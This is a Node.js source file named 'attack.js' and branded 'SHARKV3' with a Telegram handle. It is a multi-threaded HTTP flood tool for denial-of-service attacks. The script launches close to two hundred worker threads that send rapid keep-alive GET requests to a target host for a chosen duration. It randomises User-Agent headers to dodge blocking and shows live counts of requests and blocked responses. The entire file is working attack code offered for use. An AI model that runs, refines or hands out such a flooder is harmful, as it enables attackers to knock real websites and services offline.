const http = require('http'); // Use the http module for HTTP/1.1
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');
const net = require('net');

const THREADS = 99;
const POWER_MULTIPLIER = 1;
const MAX_INFLIGHT = 2000;
const LIVE_REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;  // Define the `end` variable here for the main thread

// Helper function to get a random number within a range (inclusive)
function getRandomInRange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Random User-Agent Generator function
function getRandomUserAgent() {
    const samsungModels = [
        'Samsung Galaxy S22',
        'Samsung Galaxy S21',
        'Samsung Galaxy Note 20',
        'Samsung Galaxy A53',
        'Samsung Galaxy Z Fold3',
    ];
    const iphoneModels = [
        'iPhone 13 Pro Max',
        'iPhone 12',
        'iPhone 11 Pro',
        'iPhone SE (2020)',
        'iPhone 14 Pro',
    ];
    
    // Select a random model from either Samsung or iPhone
    const deviceType = Math.random() > 0.5 ? samsungModels : iphoneModels;
    const randomModel = deviceType[Math.floor(Math.random() * deviceType.length)];
    
    // Return a User-Agent string for the selected device
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36 (${randomModel})`;
}

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    end = Date.now() + duration * 1000; // Define end time here in the main thread

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`SHARKV3! - NO CPU WARMUP .exx`);

    // Start the workers with dynamic connection numbers
    for (let i = 0; i < THREADS; i++) {
        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
    }

    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
    }

    // Live Stats
    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);

        // Remaining time calculation
        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
        const minutesRemaining = Math.floor(timeRemaining / 60);
        const secondsRemaining = Math.floor(timeRemaining % 60);

        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`succes: ${successCount}`);
        console.log(`Blocked: ${errorCount}`);
        console.log(`===========================`);
        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

} else {
    const { target, duration, initial, connections } = workerData;
    const endTime = Date.now() + duration * 1000;  // end time for worker threads

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > endTime || client.destroyed) return;

        if (inflight.count < MAX_INFLIGHT) {
            try {
                inflight.count++;
                const req = http.request({
                    hostname: target,
                    port: 80,  // Ensure you're using HTTP/1.1 and port 80
                    path: '/',
                    method: 'GET',
                    headers: {
                        'User-Agent': getRandomUserAgent(),  // Use the random User-Agent
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Connection': 'keep-alive',
                    }
                });

                req.on('response', () => {
                    inflight.count--;
                    sendStat('ok');
                });

                req.on('error', () => {
                    inflight.count--;
                    sendStat('err');
                });

                req.end();
                sendStat('req');
            } catch {
                inflight.count--;
                sendStat('err');
            }
        }

        // Slight delay to avoid killing the system
        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increased delay slightly for stability
    }

    function createConnection() {
        if (Date.now() > endTime) return;

        let client;
        try {
            client = http.request(target, {
                hostname: target,
                port: 80,  // Make sure we're using HTTP/1.1
                method: 'GET',
                headers: {
                    'User-Agent': getRandomUserAgent(),  // Random User-Agent
                    'Connection': 'keep-alive'
                }
            });

            const inflight = { count: 0 };

            client.on('error', () => {
                client.destroy();
                setTimeout(createConnection, 5000); // auto-recover fast
            });

            client.on('close', () => setTimeout(createConnection, 5000));

            client.on('connect', () => {
                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
            });
        } catch {
            setTimeout(createConnection, 1000);
        }
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
                }
